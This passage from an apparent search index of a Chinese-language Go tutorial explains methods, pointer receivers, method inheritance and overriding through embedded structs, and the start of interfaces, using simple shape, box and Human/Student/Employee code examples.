float64 {\nreturn r.width*r.height\n}\n\nfunc main() {\nr1 := Rectangle{12, 2}\nr2 := Rectangle{9, 4}\nfmt.Println(\"Area of r1 is: \", area(r1))\nfmt.Println(\"Area of r2 is: \", area(r2))\n}\n</code></pre> \u8fd9\u6bb5\u4ee3\u7801\u53ef\u4ee5\u8ba1\u7b97\u51fa\u6765\u957f\u65b9\u5f62\u7684\u9762\u79ef\uff0c\u4f46\u662farea()\u4e0d\u662f\u4f5c\u4e3aRectangle\u7684\u65b9\u6cd5\u5b9e\u73b0\u7684\uff08\u7c7b\u4f3c\u9762\u5411\u5bf9\u8c61\u91cc\u9762\u7684\u65b9\u6cd5\uff09\uff0c\u800c\u662f\u5c06Rectangle\u7684\u5bf9\u8c61\uff08\u5982r1,r2\uff09\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u51fd\u6570\u8ba1\u7b97\u9762\u79ef\u7684\u3002</p> <p>\u8fd9\u6837\u5b9e\u73b0\u5f53\u7136\u6ca1\u6709\u95ee\u9898\u54af\uff0c\u4f46\u662f\u5f53\u9700\u8981\u589e\u52a0\u5706\u5f62\u3001\u6b63\u65b9\u5f62\u3001\u4e94\u8fb9\u5f62\u751a\u81f3\u5176\u5b83\u591a\u8fb9\u5f62\u7684\u65f6\u5019\uff0c\u4f60\u60f3\u8ba1\u7b97\u4ed6\u4eec\u7684\u9762\u79ef\u7684\u65f6\u5019\u600e\u4e48\u529e\u554a\uff1f\u90a3\u5c31\u53ea\u80fd\u589e\u52a0\u65b0\u7684\u51fd\u6570\u54af\uff0c\u4f46\u662f\u51fd\u6570\u540d\u4f60\u5c31\u5fc5\u987b\u8981\u8ddf\u7740\u6362\u4e86\uff0c\u53d8\u6210<code>area_rectangle, area_circle, area_triangle...</code></p> <p>\u50cf\u4e0b\u56fe\u6240\u8868\u793a\u7684\u90a3\u6837\uff0c \u692d\u5706\u4ee3\u8868\u51fd\u6570, \u800c\u8fd9\u4e9b\u51fd\u6570\u5e76\u4e0d\u4ece\u5c5e\u4e8estruct(\u6216\u8005\u4ee5\u9762\u5411\u5bf9\u8c61\u7684\u672f\u8bed\u6765\u8bf4\uff0c\u5e76\u4e0d\u5c5e\u4e8eclass)\uff0c\u4ed6\u4eec\u662f\u5355\u72ec\u5b58\u5728\u4e8estruct\u5916\u56f4\uff0c\u800c\u975e\u5728\u6982\u5ff5\u4e0a\u5c5e\u4e8e\u67d0\u4e2astruct\u7684\u3002</p> <p></p> <p>\u56fe2.8 \u65b9\u6cd5\u548cstruct\u7684\u5173\u7cfb\u56fe</p> <p>\u5f88\u663e\u7136\uff0c\u8fd9\u6837\u7684\u5b9e\u73b0\u5e76\u4e0d\u4f18\u96c5\uff0c\u5e76\u4e14\u4ece\u6982\u5ff5\u4e0a\u6765\u8bf4\"\u9762\u79ef\"\u662f\"\u5f62\u72b6\"\u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u5b83\u662f\u5c5e\u4e8e\u8fd9\u4e2a\u7279\u5b9a\u7684\u5f62\u72b6\u7684\uff0c\u5c31\u50cf\u957f\u65b9\u5f62\u7684\u957f\u548c\u5bbd\u4e00\u6837\u3002</p> <p>\u57fa\u4e8e\u4e0a\u9762\u7684\u539f\u56e0\u6240\u4ee5\u5c31\u6709\u4e86<code>method</code>\u7684\u6982\u5ff5\uff0c<code>method</code>\u662f\u9644\u5c5e\u5728\u4e00\u4e2a\u7ed9\u5b9a\u7684\u7c7b\u578b\u4e0a\u7684\uff0c\u4ed6\u7684\u8bed\u6cd5\u548c\u51fd\u6570\u7684\u58f0\u660e\u8bed\u6cd5\u51e0\u4e4e\u4e00\u6837\uff0c\u53ea\u662f\u5728<code>func</code>\u540e\u9762\u589e\u52a0\u4e86\u4e00\u4e2areceiver(\u4e5f\u5c31\u662fmethod\u6240\u4f9d\u4ece\u7684\u4e3b\u4f53)\u3002</p> <p>\u7528\u4e0a\u9762\u63d0\u5230\u7684\u5f62\u72b6\u7684\u4f8b\u5b50\u6765\u8bf4\uff0cmethod <code>area()</code> \u662f\u4f9d\u8d56\u4e8e\u67d0\u4e2a\u5f62\u72b6(\u6bd4\u5982\u8bf4Rectangle)\u6765\u53d1\u751f\u4f5c\u7528\u7684\u3002Rectangle.area()\u7684\u53d1\u51fa\u8005\u662fRectangle\uff0c area()\u662f\u5c5e\u4e8eRectangle\u7684\u65b9\u6cd5\uff0c\u800c\u975e\u4e00\u4e2a\u5916\u56f4\u51fd\u6570\u3002</p> <p>\u66f4\u5177\u4f53\u5730\u8bf4\uff0cRectangle\u5b58\u5728\u5b57\u6bb5 height \u548c width, \u540c\u65f6\u5b58\u5728\u65b9\u6cd5area(), \u8fd9\u4e9b\u5b57\u6bb5\u548c\u65b9\u6cd5\u90fd\u5c5e\u4e8eRectangle\u3002</p> <p>\u7528Rob Pike\u7684\u8bdd\u6765\u8bf4\u5c31\u662f\uff1a</p> <p>\"A method is a function with an implicit first argument, called a receiver.\"</p> <p>method\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>func (r ReceiverType) funcName(parameters) (results)\n</code></pre> <p>\u4e0b\u9762\u6211\u4eec\u7528\u6700\u5f00\u59cb\u7684\u4f8b\u5b50\u7528method\u6765\u5b9e\u73b0\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"math\"\n)\n\ntype Rectangle struct {\nwidth, height float64\n}\n\ntype Circle struct {\nradius float64\n}\n\nfunc (r Rectangle) area() float64 {\nreturn r.width*r.height\n}\n\nfunc (c Circle) area() float64 {\nreturn c.radius * c.radius * math.Pi\n}\n\n\nfunc main() {\nr1 := Rectangle{12, 2}\nr2 := Rectangle{9, 4}\nc1 := Circle{10}\nc2 := Circle{25}\n\nfmt.Println(\"Area of r1 is: \", r1.area())\nfmt.Println(\"Area of r2 is: \", r2.area())\nfmt.Println(\"Area of c1 is: \", c1.area())\nfmt.Println(\"Area of c2 is: \", c2.area())\n}\n</code></pre></p> <p>\u5728\u4f7f\u7528method\u7684\u65f6\u5019\u91cd\u8981\u6ce8\u610f\u51e0\u70b9</p> <ul> <li>\u867d\u7136method\u7684\u540d\u5b57\u4e00\u6a21\u4e00\u6837\uff0c\u4f46\u662f\u5982\u679c\u63a5\u6536\u8005\u4e0d\u4e00\u6837\uff0c\u90a3\u4e48method\u5c31\u4e0d\u4e00\u6837</li> <li>method\u91cc\u9762\u53ef\u4ee5\u8bbf\u95ee\u63a5\u6536\u8005\u7684\u5b57\u6bb5</li> <li>\u8c03\u7528method\u901a\u8fc7<code>.</code>\u8bbf\u95ee\uff0c\u5c31\u50cfstruct\u91cc\u9762\u8bbf\u95ee\u5b57\u6bb5\u4e00\u6837</li> </ul> <p>\u56fe\u793a\u5982\u4e0b:</p> <p></p> <p>\u56fe2.9 \u4e0d\u540cstruct\u7684method\u4e0d\u540c</p> <p>\u5728\u4e0a\u4f8b\uff0cmethod area() \u5206\u522b\u5c5e\u4e8eRectangle\u548cCircle\uff0c \u4e8e\u662f\u4ed6\u4eec\u7684 Receiver \u5c31\u53d8\u6210\u4e86Rectangle \u548c Circle, \u6216\u8005\u8bf4\uff0c\u8fd9\u4e2aarea()\u65b9\u6cd5 \u662f\u7531 Rectangle/Circle \u53d1\u51fa\u7684\u3002</p> <p>\u503c\u5f97\u8bf4\u660e\u7684\u4e00\u70b9\u662f\uff0c\u56fe\u793a\u4e2dmethod\u7528\u865a\u7ebf\u6807\u51fa\uff0c\u610f\u601d\u662f\u6b64\u5904\u65b9\u6cd5\u7684Receiver\u662f\u4ee5\u503c\u4f20\u9012\uff0c\u800c\u975e\u5f15\u7528\u4f20\u9012\uff0c\u662f\u7684\uff0cReceiver\u8fd8\u53ef\u4ee5\u662f\u6307\u9488, \u4e24\u8005\u7684\u5dee\u522b\u5728\u4e8e, \u6307\u9488\u4f5c\u4e3aReceiver\u4f1a\u5bf9\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5185\u5bb9\u53d1\u751f\u64cd\u4f5c,\u800c\u666e\u901a\u7c7b\u578b\u4f5c\u4e3aReceiver\u4ec5\u4ec5\u662f\u4ee5\u526f\u672c\u4f5c\u4e3a\u64cd\u4f5c\u5bf9\u8c61,\u5e76\u4e0d\u5bf9\u539f\u5b9e\u4f8b\u5bf9\u8c61\u53d1\u751f\u64cd\u4f5c\u3002\u540e\u6587\u5bf9\u6b64\u4f1a\u6709\u8be6\u7ec6\u8bba\u8ff0\u3002</p> <p>\u90a3\u662f\u4e0d\u662fmethod\u53ea\u80fd\u4f5c\u7528\u5728struct\u4e0a\u9762\u5462\uff1f\u5f53\u7136\u4e0d\u662f\u54af\uff0c\u4ed6\u53ef\u4ee5\u5b9a\u4e49\u5728\u4efb\u4f55\u4f60\u81ea\u5b9a\u4e49\u7684\u7c7b\u578b\u3001\u5185\u7f6e\u7c7b\u578b\u3001struct\u7b49\u5404\u79cd\u7c7b\u578b\u4e0a\u9762\u3002\u8fd9\u91cc\u4f60\u662f\u4e0d\u662f\u6709\u70b9\u8ff7\u7cca\u4e86\uff0c\u4ec0\u4e48\u53eb\u81ea\u5b9a\u4e49\u7c7b\u578b\uff0c\u81ea\u5b9a\u4e49\u7c7b\u578b\u4e0d\u5c31\u662fstruct\u561b\uff0c\u4e0d\u662f\u8fd9\u6837\u7684\u54e6\uff0cstruct\u53ea\u662f\u81ea\u5b9a\u4e49\u7c7b\u578b\u91cc\u9762\u4e00\u79cd\u6bd4\u8f83\u7279\u6b8a\u7684\u7c7b\u578b\u800c\u5df2\uff0c\u8fd8\u6709\u5176\u4ed6\u81ea\u5b9a\u4e49\u7c7b\u578b\u7533\u660e\uff0c\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u8fd9\u6837\u7684\u7533\u660e\u6765\u5b9e\u73b0\u3002 <pre><code>type typeName typeLiteral\n</code></pre> \u8bf7\u770b\u4e0b\u9762\u8fd9\u4e2a\u7533\u660e\u81ea\u5b9a\u4e49\u7c7b\u578b\u7684\u4ee3\u7801 <pre><code>type ages int\n\ntype money float32\n\ntype months map[string]int\n\nm := months {\n\"January\":31,\n\"February\":28,\n...\n\"December\":31,\n}\n</code></pre> \u770b\u5230\u4e86\u5417\uff1f\u7b80\u5355\u7684\u5f88\u5427\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u5728\u81ea\u5df1\u7684\u4ee3\u7801\u91cc\u9762\u5b9a\u4e49\u6709\u610f\u4e49\u7684\u7c7b\u578b\u4e86\uff0c\u5b9e\u9645\u4e0a\u53ea\u662f\u4e00\u4e2a\u5b9a\u4e49\u4e86\u4e00\u4e2a\u522b\u540d,\u6709\u70b9\u7c7b\u4f3c\u4e8ec\u4e2d\u7684typedef\uff0c\u4f8b\u5982\u4e0a\u9762ages\u66ff\u4ee3\u4e86int</p> <p>\u597d\u4e86\uff0c\u8ba9\u6211\u4eec\u56de\u5230<code>method</code></p> <p>\u4f60\u53ef\u4ee5\u5728\u4efb\u4f55\u7684\u81ea\u5b9a\u4e49\u7c7b\u578b\u4e2d\u5b9a\u4e49\u4efb\u610f\u591a\u7684<code>method</code>\uff0c\u63a5\u4e0b\u6765\u8ba9\u6211\u4eec\u770b\u4e00\u4e2a\u590d\u6742\u4e00\u70b9\u7684\u4f8b\u5b50 <pre><code>package main\n\nimport \"fmt\"\n\nconst(\nWHITE = iota\nBLACK\nBLUE\nRED\nYELLOW\n)\n\ntype Color byte\n\ntype Box struct {\nwidth, height, depth float64\ncolor Color\n}\n\ntype BoxList []Box //a slice of boxes\n\nfunc (b Box) Volume() float64 {\nreturn b.width * b.height * b.depth\n}\n\nfunc (b *Box) SetColor(c Color) {\nb.color = c\n}\n\nfunc (bl BoxList) BiggestColor() Color {\nv := 0.00\nk := Color(WHITE)\nfor _, b := range bl {\nif bv := b.Volume(); bv &gt; v {\nv = bv\nk = b.color\n}\n}\nreturn k\n}\n\nfunc (bl BoxList) PaintItBlack() {\nfor i := range bl {\nbl[i].SetColor(BLACK)\n}\n}\n\nfunc (c Color) String() string {\nstrings := []string {\"WHITE\", \"BLACK\", \"BLUE\", \"RED\", \"YELLOW\"}\nreturn strings[c]\n}\n\nfunc main() {\nboxes := BoxList {\nBox{4, 4, 4, RED},\nBox{10, 10, 1, YELLOW},\nBox{1, 1, 20, BLACK},\nBox{10, 10, 1, BLUE},\nBox{10, 30, 1, WHITE},\nBox{20, 20, 20, YELLOW},\n}\n\nfmt.Printf(\"We have %d boxes in our set\\n\", len(boxes))\nfmt.Println(\"The volume of the first one is\", boxes[0].Volume(), \"cm\u00b3\")\nfmt.Println(\"The color of the last one is\",boxes[len(boxes)-1].color.String())\nfmt.Println(\"The biggest one is\", boxes.BiggestColor().String())\n\nfmt.Println(\"Let's paint them all black\")\nboxes.PaintItBlack()\nfmt.Println(\"The color of the second one is\", boxes[1].color.String())\n\nfmt.Println(\"Obviously, now, the biggest one is\", boxes.BiggestColor().String())\n}\n</code></pre> \u4e0a\u9762\u7684\u4ee3\u7801\u901a\u8fc7const\u5b9a\u4e49\u4e86\u4e00\u4e9b\u5e38\u91cf\uff0c\u7136\u540e\u5b9a\u4e49\u4e86\u4e00\u4e9b\u81ea\u5b9a\u4e49\u7c7b\u578b</p> <ul> <li>Color\u4f5c\u4e3abyte\u7684\u522b\u540d</li> <li>\u5b9a\u4e49\u4e86\u4e00\u4e2astruct:Box\uff0c\u542b\u6709\u4e09\u4e2a\u957f\u5bbd\u9ad8\u5b57\u6bb5\u548c\u4e00\u4e2a\u989c\u8272\u5c5e\u6027</li> <li>\u5b9a\u4e49\u4e86\u4e00\u4e2aslice:BoxList\uff0c\u542b\u6709Box</li> </ul> <p>\u7136\u540e\u4ee5\u4e0a\u9762\u7684\u81ea\u5b9a\u4e49\u7c7b\u578b\u4e3a\u63a5\u6536\u8005\u5b9a\u4e49\u4e86\u4e00\u4e9bmethod</p> <ul> <li>Volume()\u5b9a\u4e49\u4e86\u63a5\u6536\u8005\u4e3aBox\uff0c\u8fd4\u56deBox\u7684\u5bb9\u91cf</li> <li>SetColor(c Color)\uff0c\u628aBox\u7684\u989c\u8272\u6539\u4e3ac</li> <li>BiggestColor()\u5b9a\u5728\u5728BoxList\u4e0a\u9762\uff0c\u8fd4\u56delist\u91cc\u9762\u5bb9\u91cf\u6700\u5927\u7684\u989c\u8272</li> <li>PaintItBlack()\u628aBoxList\u91cc\u9762\u6240\u6709Box\u7684\u989c\u8272\u5168\u90e8\u53d8\u6210\u9ed1\u8272</li> <li>String()\u5b9a\u4e49\u5728Color\u4e0a\u9762\uff0c\u8fd4\u56deColor\u7684\u5177\u4f53\u989c\u8272(\u5b57\u7b26\u4e32\u683c\u5f0f)</li> </ul> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u901a\u8fc7\u6587\u5b57\u63cf\u8ff0\u51fa\u6765\u4e4b\u540e\u662f\u4e0d\u662f\u5f88\u7b80\u5355\uff1f\u6211\u4eec\u4e00\u822c\u89e3\u51b3\u95ee\u9898\u90fd\u662f\u901a\u8fc7\u95ee\u9898\u7684\u63cf\u8ff0\uff0c\u53bb\u5199\u76f8\u5e94\u7684\u4ee3\u7801\u5b9e\u73b0\u3002</p>"},{"location":"02.5/#receiver","title":"\u6307\u9488\u4f5c\u4e3areceiver","text":"<p>\u73b0\u5728\u8ba9\u6211\u4eec\u56de\u8fc7\u5934\u6765\u770b\u770bSetColor\u8fd9\u4e2amethod\uff0c\u5b83\u7684receiver\u662f\u4e00\u4e2a\u6307\u5411Box\u7684\u6307\u9488\uff0c\u662f\u7684\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528*Box\u3002\u60f3\u60f3\u4e3a\u5565\u8981\u4f7f\u7528\u6307\u9488\u800c\u4e0d\u662fBox\u672c\u8eab\u5462\uff1f</p> <p>\u6211\u4eec\u5b9a\u4e49SetColor\u7684\u771f\u6b63\u76ee\u7684\u662f\u60f3\u6539\u53d8\u8fd9\u4e2aBox\u7684\u989c\u8272\uff0c\u5982\u679c\u4e0d\u4f20Box\u7684\u6307\u9488\uff0c\u90a3\u4e48SetColor\u63a5\u53d7\u7684\u5176\u5b9e\u662fBox\u7684\u4e00\u4e2acopy\uff0c\u4e5f\u5c31\u662f\u8bf4method\u5185\u5bf9\u4e8e\u989c\u8272\u503c\u7684\u4fee\u6539\uff0c\u5176\u5b9e\u53ea\u4f5c\u7528\u4e8eBox\u7684copy\uff0c\u800c\u4e0d\u662f\u771f\u6b63\u7684Box\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4f20\u5165\u6307\u9488\u3002</p> <p>\u8fd9\u91cc\u53ef\u4ee5\u628areceiver\u5f53\u4f5cmethod\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u6765\u770b\uff0c\u7136\u540e\u7ed3\u5408\u524d\u9762\u51fd\u6570\u8bb2\u89e3\u7684\u4f20\u503c\u548c\u4f20\u5f15\u7528\u5c31\u4e0d\u96be\u7406\u89e3</p> <p>\u8fd9\u91cc\u4f60\u4e5f\u8bb8\u4f1a\u95ee\u4e86\u90a3SetColor\u51fd\u6570\u91cc\u9762\u5e94\u8be5\u8fd9\u6837\u5b9a\u4e49<code>*b.Color=c</code>,\u800c\u4e0d\u662f<code>b.Color=c</code>,\u56e0\u4e3a\u6211\u4eec\u9700\u8981\u8bfb\u53d6\u5230\u6307\u9488\u76f8\u5e94\u7684\u503c\u3002</p> <p>\u4f60\u662f\u5bf9\u7684\uff0c\u5176\u5b9eGo\u91cc\u9762\u8fd9\u4e24\u79cd\u65b9\u5f0f\u90fd\u662f\u6b63\u786e\u7684\uff0c\u5f53\u4f60\u7528\u6307\u9488\u53bb\u8bbf\u95ee\u76f8\u5e94\u7684\u5b57\u6bb5\u65f6(\u867d\u7136\u6307\u9488\u6ca1\u6709\u4efb\u4f55\u7684\u5b57\u6bb5)\uff0cGo\u77e5\u9053\u4f60\u8981\u901a\u8fc7\u6307\u9488\u53bb\u83b7\u53d6\u8fd9\u4e2a\u503c\uff0c\u770b\u5230\u4e86\u5427\uff0cGo\u7684\u8bbe\u8ba1\u662f\u4e0d\u662f\u8d8a\u6765\u8d8a\u5438\u5f15\u4f60\u4e86\u3002</p> <p>\u4e5f\u8bb8\u7ec6\u5fc3\u7684\u8bfb\u8005\u4f1a\u95ee\u8fd9\u6837\u7684\u95ee\u9898\uff0cPaintItBlack\u91cc\u9762\u8c03\u7528SetColor\u7684\u65f6\u5019\u662f\u4e0d\u662f\u5e94\u8be5\u5199\u6210<code>(&amp;bl[i]).SetColor(BLACK)</code>\uff0c\u56e0\u4e3aSetColor\u7684receiver\u662f*Box\uff0c\u800c\u4e0d\u662fBox\u3002</p> <p>\u4f60\u53c8\u8bf4\u5bf9\u4e86\uff0c\u8fd9\u4e24\u79cd\u65b9\u5f0f\u90fd\u53ef\u4ee5\uff0c\u56e0\u4e3aGo\u77e5\u9053receiver\u662f\u6307\u9488\uff0c\u4ed6\u81ea\u52a8\u5e2e\u4f60\u8f6c\u4e86\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff1a</p> <p>\u5982\u679c\u4e00\u4e2amethod\u7684receiver\u662f*T,\u4f60\u53ef\u4ee5\u5728\u4e00\u4e2aT\u7c7b\u578b\u7684\u5b9e\u4f8b\u53d8\u91cfV\u4e0a\u9762\u8c03\u7528\u8fd9\u4e2amethod\uff0c\u800c\u4e0d\u9700\u8981&amp;V\u53bb\u8c03\u7528\u8fd9\u4e2amethod</p> <p>\u7c7b\u4f3c\u7684</p> <p>\u5982\u679c\u4e00\u4e2amethod\u7684receiver\u662fT\uff0c\u4f60\u53ef\u4ee5\u5728\u4e00\u4e2a*T\u7c7b\u578b\u7684\u53d8\u91cfP\u4e0a\u9762\u8c03\u7528\u8fd9\u4e2amethod\uff0c\u800c\u4e0d\u9700\u8981 *P\u53bb\u8c03\u7528\u8fd9\u4e2amethod</p> <p>\u6240\u4ee5\uff0c\u4f60\u4e0d\u7528\u62c5\u5fc3\u4f60\u662f\u8c03\u7528\u7684\u6307\u9488\u7684method\u8fd8\u662f\u4e0d\u662f\u6307\u9488\u7684method\uff0cGo\u77e5\u9053\u4f60\u8981\u505a\u7684\u4e00\u5207\uff0c\u8fd9\u5bf9\u4e8e\u6709\u591a\u5e74C/C++\u7f16\u7a0b\u7ecf\u9a8c\u7684\u540c\u5b66\u6765\u8bf4\uff0c\u771f\u662f\u89e3\u51b3\u4e86\u4e00\u4e2a\u5f88\u5927\u7684\u75db\u82e6\u3002</p>"},{"location":"02.5/#method_1","title":"method\u7ee7\u627f","text":"<p>\u524d\u9762\u4e00\u7ae0\u6211\u4eec\u5b66\u4e60\u4e86\u5b57\u6bb5\u7684\u7ee7\u627f\uff0c\u90a3\u4e48\u4f60\u4e5f\u4f1a\u53d1\u73b0Go\u7684\u4e00\u4e2a\u795e\u5947\u4e4b\u5904\uff0cmethod\u4e5f\u662f\u53ef\u4ee5\u7ee7\u627f\u7684\u3002\u5982\u679c\u533f\u540d\u5b57\u6bb5\u5b9e\u73b0\u4e86\u4e00\u4e2amethod\uff0c\u90a3\u4e48\u5305\u542b\u8fd9\u4e2a\u533f\u540d\u5b57\u6bb5\u7684struct\u4e5f\u80fd\u8c03\u7528\u8be5method\u3002\u8ba9\u6211\u4eec\u6765\u770b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50 <pre><code>package main\n\nimport \"fmt\"\n\ntype Human struct {\nname string\nage int\nphone string\n}\n\ntype Student struct {\nHuman //\u533f\u540d\u5b57\u6bb5\nschool string\n}\n\ntype Employee struct {\nHuman //\u533f\u540d\u5b57\u6bb5\ncompany string\n}\n\n//\u5728human\u4e0a\u9762\u5b9a\u4e49\u4e86\u4e00\u4e2amethod\nfunc (h *Human) SayHi() {\nfmt.Printf(\"Hi, I am %s you can call me on %s\\n\", h.name, h.phone)\n}\n\nfunc main() {\nmark := Student{Human{\"Mark\", 25, \"222-222-YYYY\"}, \"MIT\"}\nsam := Employee{Human{\"Sam\", 45, \"111-888-XXXX\"}, \"Golang Inc\"}\n\nmark.SayHi()\nsam.SayHi()\n}\n</code></pre></p>"},{"location":"02.5/#method_2","title":"method\u91cd\u5199","text":"<p>\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u5982\u679cEmployee\u60f3\u8981\u5b9e\u73b0\u81ea\u5df1\u7684SayHi,\u600e\u4e48\u529e\uff1f\u7b80\u5355\uff0c\u548c\u533f\u540d\u5b57\u6bb5\u51b2\u7a81\u4e00\u6837\u7684\u9053\u7406\uff0c\u6211\u4eec\u53ef\u4ee5\u5728Employee\u4e0a\u9762\u5b9a\u4e49\u4e00\u4e2amethod\uff0c\u91cd\u5199\u4e86\u533f\u540d\u5b57\u6bb5\u7684\u65b9\u6cd5\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50 <pre><code>package main\n\nimport \"fmt\"\n\ntype Human struct {\nname string\nage int\nphone string\n}\n\ntype Student struct {\nHuman //\u533f\u540d\u5b57\u6bb5\nschool string\n}\n\ntype Employee struct {\nHuman //\u533f\u540d\u5b57\u6bb5\ncompany string\n}\n\n//Human\u5b9a\u4e49method\nfunc (h *Human) SayHi() {\nfmt.Printf(\"Hi, I am %s you can call me on %s\\n\", h.name, h.phone)\n}\n\n//Employee\u7684method\u91cd\u5199Human\u7684method\nfunc (e *Employee) SayHi() {\nfmt.Printf(\"Hi, I am %s, I work at %s. Call me on %s\\n\", e.name,\ne.company, e.phone) //Yes you can split into 2 lines here.\n}\n\nfunc main() {\nmark := Student{Human{\"Mark\", 25, \"222-222-YYYY\"}, \"MIT\"}\nsam := Employee{Human{\"Sam\", 45, \"111-888-XXXX\"}, \"Golang Inc\"}\n\nmark.SayHi()\nsam.SayHi()\n}\n</code></pre> \u4e0a\u9762\u7684\u4ee3\u7801\u8bbe\u8ba1\u7684\u662f\u5982\u6b64\u7684\u7f8e\u5999\uff0c\u8ba9\u4eba\u4e0d\u81ea\u89c9\u7684\u4e3aGo\u7684\u8bbe\u8ba1\u60ca\u53f9\uff01</p> <p>\u901a\u8fc7\u8fd9\u4e9b\u5185\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u8ba1\u51fa\u57fa\u672c\u7684\u9762\u5411\u5bf9\u8c61\u7684\u7a0b\u5e8f\u4e86\uff0c\u4f46\u662fGo\u91cc\u9762\u7684\u9762\u5411\u5bf9\u8c61\u662f\u5982\u6b64\u7684\u7b80\u5355\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u79c1\u6709\u3001\u516c\u6709\u5173\u952e\u5b57\uff0c\u901a\u8fc7\u5927\u5c0f\u5199\u6765\u5b9e\u73b0(\u5927\u5199\u5f00\u5934\u7684\u4e3a\u516c\u6709\uff0c\u5c0f\u5199\u5f00\u5934\u7684\u4e3a\u79c1\u6709)\uff0c\u65b9\u6cd5\u4e5f\u540c\u6837\u9002\u7528\u8fd9\u4e2a\u539f\u5219\u3002</p>"},{"location":"02.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: struct\u7c7b\u578b</li> <li>\u4e0b\u4e00\u8282: interface</li> </ul>"},{"location":"02.6/","title":"2.6 interface","text":""},{"location":"02.6/#interface","title":"interface","text":"<p>Go\u8bed\u8a00\u91cc\u9762\u8bbe\u8ba1\u6700\u7cbe\u5999\u7684\u5e94\u8be5\u7b97interface\uff0c\u5b83\u8ba9\u9762\u5411\u5bf9\u8c61\uff0c\u5185\u5bb9\u7ec4\u7ec7\u5b9e\u73b0\u975e\u5e38\u7684\u65b9\u4fbf\uff0c\u5f53\u4f60\u770b\u5b8c\u8fd9\u4e00\u7ae0\uff0c\u4f60\u5c31\u4f1a\u88abinterface\u7684\u5de7\u5999\u8bbe\u8ba1\u6240\u6298\u670d\u3002</p>"},{"location":"02.6/#interface_1","title":"\u4ec0\u4e48\u662finterface","text":"<p>\u7b80\u5355\u7684\u8bf4\uff0cinterface\u662f\u4e00\u7ec4method\u7b7e\u540d\u7684\u7ec4\u5408\uff0c\u6211\u4eec\u901a\u8fc7interface\u6765\u5b9a\u4e49\u5bf9\u8c61\u7684\u4e00\u7ec4\u884c\u4e3a\u3002</p> <p>\u6211\u4eec\u524d\u9762\u4e00\u7ae0\u6700\u540e\u4e00\u4e2a\u4f8b\u5b50\u4e2dStudent\u548cEmployee\u90fd\u80fdSayHi\uff0c\u867d\u7136\u4ed6\u4eec\u7684\u5185\u90e8\u5b9e\u73b0\u4e0d\u4e00\u6837\uff0c\u4f46\u662f\u90a3\u4e0d\u91cd\u8981\uff0c\u91cd\u8981\u7684\u662f\u4ed6\u4eec\u90fd\u80fd<code>say hi</code></p> <p>\u8ba9\u6211\u4eec\u6765\u7ee7\u7eed\u505a\u66f4\u591a\u7684\u6269\u5c55\uff0cStudent\u548cEmployee\u5b9e\u73b0\u53e6\u4e00\u4e2a\u65b9\u6cd5<code>Sing</code>\uff0c\u7136\u540eStudent\u5b9e\u73b0\u65b9\u6cd5BorrowMoney\u800cEmployee\u5b9e\u73b0SpendSalary\u3002</p> <p>\u8fd9\u6837Student\u5b9e\u73b0\u4e86\u4e09\u4e2a\u65b9\u6cd5\uff1aSayHi\u3001Sing\u3001BorrowMoney\uff1b\u800cEmployee\u5b9e\u73b0\u4e86SayHi\u3001Sing\u3001SpendSalary\u3002</p> <p>\u4e0a\u9762\u8fd9\u4e9b\u65b9\u6cd5\u7684\u7ec4\u5408\u79f0\u4e3ainterface(\u88ab\u5bf9\u8c61Student\u548cEmployee\u5b9e\u73b0)\u3002\u4f8b\u5982Student\u548cEmployee\u90fd\u5b9e\u73b0\u4e86interface\uff1aSayHi\u548cSing\uff0c\u4e5f\u5c31\u662f\u8fd9\u4e24\u4e2a\u5bf9\u8c61\u662f\u8be5interface\u7c7b\u578b\u3002\u800cEmployee\u6ca1\u6709\u5b9e\u73b0\u8fd9\u4e2ainterface\uff1aSayHi\u3001Sing\u548cBorrowMoney\uff0c\u56e0\u4e3aEmployee\u6ca1\u6709\u5b9e\u73b0BorrowMoney\u8fd9\u4e2a\u65b9\u6cd5\u3002</p>"},{"location":"02.6/#interface_2","title":"interface\u7c7b\u578b","text":"<p>interface\u7c7b\u578b\u5b9a\u4e49\u4e86\u4e00\u7ec4\u65b9\u6cd5\uff0c\u5982\u679c\u67d0\u4e2a\u5bf9\u8c61\u5b9e\u73b0\u4e86\u67d0\u4e2a\u63a5\u53e3\u7684\u6240\u6709\u65b9\u6cd5\uff0c\u5219\u6b64\u5bf9\u8c61\u5c31\u5b9e\u73b0\u4e86\u6b64\u63a5\u53e3\u3002\u8be6\u7ec6\u7684\u8bed\u6cd5\u53c2\u8003\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50 <pre><code>type Human struct {\nname string\nage int\nphone string\n}\n\ntype Student struct {\nHuman //\u533f\u540d\u5b57\u6bb5Human\nschool string\nloan float32\n}\n\ntype Employee struct {\nHuman //\u533f\u540d\u5b57\u6bb5Human\ncompany string\nmoney float32\n}\n\n//Human\u5bf9\u8c61\u5b9e\u73b0Sayhi\u65b9\u6cd5\nfunc (h *Human) SayHi() {\nfmt.Printf(\"Hi, I am %s you can call me on %s\\n\", h.name, h.phone)\n}\n\n// Human\u5bf9\u8c61\u5b9e\u73b0Sing\u65b9\u6cd5\nfunc (h *Human) Sing(lyrics string) {\nfmt.Println(\"La la, la la la, la la la la la...\", lyrics)\n}\n\n//Human\u5bf9\u8c61\u5b9e\u73b0Guzzle\u65b9\u6cd5\nfunc (h *Human) Guzzle(beerStein string) {\nfmt.Println(\"Guzzle Guzzle Guzzle...\", beerStein)\n}\n\n// Employee\u91cd\u8f7dHuman\u7684Sayhi\u65b9\u6cd5\nfunc (e *Employee) SayHi() 